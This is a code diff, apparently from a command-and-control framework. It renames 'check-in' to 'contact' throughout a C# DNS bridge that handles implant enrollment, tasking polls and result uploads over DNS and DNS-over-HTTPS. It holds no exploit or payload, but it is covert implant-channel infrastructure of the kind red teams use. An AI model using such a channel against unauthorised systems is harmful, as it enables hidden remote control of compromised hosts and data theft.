@@ -19,12 +19,12 @@ using Task = System.Threading.Tasks.Task;
 
 namespace Rod.Transport.Listeners.Dns;
 
-// The DNS check-in bridge (architecture.md Sec 8): maps the datagram-shaped
+// The DNS contact bridge (architecture.md Sec 8): maps the datagram-shaped
 // DNS contract onto the same core-state machinery the beacon stream uses --
 // presence through the session registry, tasking through TaskService with the
 // CA's command signature, results through the capture-and-audit composition
 // the beacon endpoint performs. DNS carries no handshake and no mTLS on the
-// check-in path: the transport assumes the implant's session was opened on a
+// contact path: the transport assumes the implant's session was opened on a
 // handshake-capable transport and refreshes it; identity on the wire is the
 // implant id alone (the egress-restricted tradeoff, documented in
 // extending/implants.md). Downstream tasking stays tamper-evident regardless:
@@ -41,7 +41,7 @@ namespace Rod.Transport.Listeners.Dns;
 // accepted DNS enrollment opens the session itself (no handshake exists to
 // open it): the polls that follow refresh what it wrote.
 //
-// Sealing beyond the enroll exchange (the check-in carriage's own): an
+// Sealing beyond the enroll exchange (the contact carriage's own): an
 // artifact whose build baked an envelope key polls k.-named (the key id in
 // the name, so the answer seals statelessly -- no in-memory pairing needs to
 // survive a restart for the ciphertext to resume), its tasking and parked
@@ -53,7 +53,7 @@ namespace Rod.Transport.Listeners.Dns;
 // unchanged, while tasking disclosure and output disclosure close.
 
 /// <summary>
-/// Serves enroll, poll, and result check-ins for one teamserver. Singleton:
+/// Serves enroll, poll, and result contacts for one teamserver. Singleton:
 /// the UDP listener services (one per DNS listener entry) and the DoH route
 /// share it.
 /// </summary>
@@ -89,15 +89,15 @@ internal sealed class DnsBeaconBridge
     private readonly ILiveEventBus _bus;
     private readonly TimeProvider _clock;
     private readonly BeaconTasking _tasking;
-    private readonly DnsCheckInNames.ResultReassembler _results = new();
+    private readonly DnsContactNames.ResultReassembler _results = new();
     private readonly EnrollmentService _enrollment;
     private readonly Rod.CoreState.Staging.IStagerTokenService _tokens;
     private readonly Rod.Audit.IPayloadStore _payloads;
-    private readonly EnvelopeCheckInKeys _checkInKeys;
+    private readonly EnvelopeContactKeys _contactKeys;
     private readonly IImplantRepository _implants;
     private readonly Rod.Transport.Channels.DegradedChannelHub _degraded;
     private readonly BeaconIngest _ingest;
-    private readonly DnsCheckInNames.ResultReassembler _channelOutputs = new();
+    private readonly DnsContactNames.ResultReassembler _channelOutputs = new();
     private readonly object _enrollGate = new();
     private readonly Dictionary<string, List<byte[]>> _enrollUploads = new();
     private readonly Dictionary<string, byte[]> _enrollAnswers = new();
@@ -121,7 +121,7 @@ internal sealed class DnsBeaconBridge
         EnrollmentService enrollment,
         Rod.CoreState.Staging.IStagerTokenService tokens,
         Rod.Audit.IPayloadStore payloads,
-        EnvelopeCheckInKeys checkInKeys,
+        EnvelopeContactKeys contactKeys,
         IImplantRepository implants,
         Rod.Transport.Channels.DegradedChannelHub degraded,
         BeaconIngest ingest)
@@ -135,7 +135,7 @@ internal sealed class DnsBeaconBridge
         _enrollment = enrollment;
         _tokens = tokens;
         _payloads = payloads;
-        _checkInKeys = checkInKeys;
+        _contactKeys = contactKeys;
         _implants = implants;
         _degraded = degraded;
         _ingest = ingest;
@@ -157,7 +157,7 @@ internal sealed class DnsBeaconBridge
         byte[] chunk,
         CancellationToken cancellationToken)
     {
-        var key = DnsCheckInNames.Encode(stream);
+        var key = DnsContactNames.Encode(stream);
         List<byte[]> parts;
         lock (_enrollGate)
         {
@@ -207,7 +207,7 @@ internal sealed class DnsBeaconBridge
         var sealedKeyId = Guid.Empty;
         var sealedKeyBytes = Array.Empty<byte>();
         var framed = body;
-        if (EnvelopeBeaconCheckIn.TryReadSealedKeyId(body, out var sealedText) is { } keyId)
+        if (EnvelopeBeaconContact.TryReadSealedKeyId(body, out var sealedText) is { } keyId)
         {
             var carrier = await _payloads.FindByEnvelopeKeyAsync(keyId, cancellationToken);
             if (carrier?.EnvelopeKey is not { } artifactKey)
@@ -248,7 +248,7 @@ internal sealed class DnsBeaconBridge
             _enrollment,
             _tokens,
             _payloads,
-            _checkInKeys,
+            _contactKeys,
             _audit,
             _clock,
             cancellationToken);
@@ -295,11 +295,11 @@ internal sealed class DnsBeaconBridge
                 _enrollAnswerOrder.RemoveAt(0);
                 _enrollAnswers.Remove(oldestAnswer);
             }
-            var tokenKey = DnsCheckInNames.Encode(token);
+            var tokenKey = DnsContactNames.Encode(token);
             _enrollAnswers[tokenKey] = answer;
             _enrollAnswerOrder.Add(tokenKey);
         }
-        return System.Text.Encoding.ASCII.GetBytes("=" + DnsCheckInNames.Encode(token));
+        return System.Text.Encoding.ASCII.GetBytes("=" + DnsContactNames.Encode(token));
     }
 
     /// <summary>
@@ -312,7 +312,7 @@ internal sealed class DnsBeaconBridge
         string part;
         lock (_enrollGate)
         {
-            if (!_enrollAnswers.TryGetValue(DnsCheckInNames.Encode(token), out var answer))
+            if (!_enrollAnswers.TryGetValue(DnsContactNames.Encode(token), out var answer))
                 return Task.FromResult<byte[]?>(null);
             var from = sequence * AnswerChunkBytes;
             if (from >= answer.Length)
@@ -321,7 +321,7 @@ internal sealed class DnsBeaconBridge
             var chunk = new byte[take];
             Array.Copy(answer, from, chunk, 0, take);
             var terminal = from + take >= answer.Length;
-            part = (terminal ? "t." : "m.") + DnsCheckInNames.Encode(chunk);
+            part = (terminal ? "t." : "m.") + DnsContactNames.Encode(chunk);
         }
         return Task.FromResult<byte[]?>(System.Text.Encoding.ASCII.GetBytes(part));
     }
@@ -344,7 +344,7 @@ internal sealed class DnsBeaconBridge
     /// </summary>
     public Task<byte[]?> PollAsync(ImplantId implant, CancellationToken cancellationToken)
     {
-        if (_checkInKeys.TryGet(implant) is not null)
+        if (_contactKeys.TryGet(implant) is not null)
             return Task.FromResult<byte[]?>(null);
         return BuildPollPayloadAsync(implant, cancellationToken);
     }
@@ -366,7 +366,7 @@ internal sealed class DnsBeaconBridge
         var carrier = await _payloads.FindByEnvelopeKeyAsync(keyId, cancellationToken);
         if (carrier?.EnvelopeKey is not { } key)
             return await BuildPollPayloadAsync(implant, cancellationToken);
-        _checkInKeys.Bind(implant, keyId, key);
+        _contactKeys.Bind(implant, keyId, key);
         var payload = await BuildPollPayloadAsync(implant, cancellationToken);
         return payload is null
             ? null
@@ -389,7 +389,7 @@ internal sealed class DnsBeaconBridge
             return null;
 
         // Re-touch with the session's own capabilities: the touch replaces
-        // them, and a DNS check-in carries no advertisement of its own.
+        // them, and a DNS contact carries no advertisement of its own.
         await _sessions.TouchAsync(implant, session.Capabilities, _clock.GetUtcNow(), "dns", cancellationToken);
 
         var degraded = session.Capabilities.Contains(Rod.Transport.Channels.DegradedChannelHub.Capability);
@@ -479,7 +479,7 @@ internal sealed class DnsBeaconBridge
 
     /// <summary>
     /// One result chunk: reassembles (the bounded buffer in
-    /// <see cref="DnsCheckInNames"/>); on the terminal chunk, captures the
+    /// <see cref="DnsContactNames"/>); on the terminal chunk, captures the
     /// outcome into the task with the same audit and live-event composition
     /// the beacon stream performs. The implant is attributed by its id -- the
     /// DNS tradeoff -- and a result for an implant other than the task's own
@@ -638,7 +638,7 @@ internal sealed class DnsBeaconBridge
     // Notes one delivered blob in the bounded ledger, oldest-first pruned.
     private void NoteDelivered(TaskId task, byte[] plaintext)
     {
-        var key = DeliveryKey(task, DnsCheckInNames.DeliverySha(plaintext));
+        var key = DeliveryKey(task, DnsContactNames.DeliverySha(plaintext));
         lock (_deliveryGate)
         {
             if (_deliveryAcks.ContainsKey(key))
@@ -677,6 +677,6 @@ internal sealed class DnsBeaconBridge
                 return null;
             return AesGcmEnvelope.TryUnwrapBody(blob, keyId, key, aad);
         }
-        return _checkInKeys.TryGet(implant) is null ? blob : null;
+        return _contactKeys.TryGet(implant) is null ? blob : null;
     }
 }
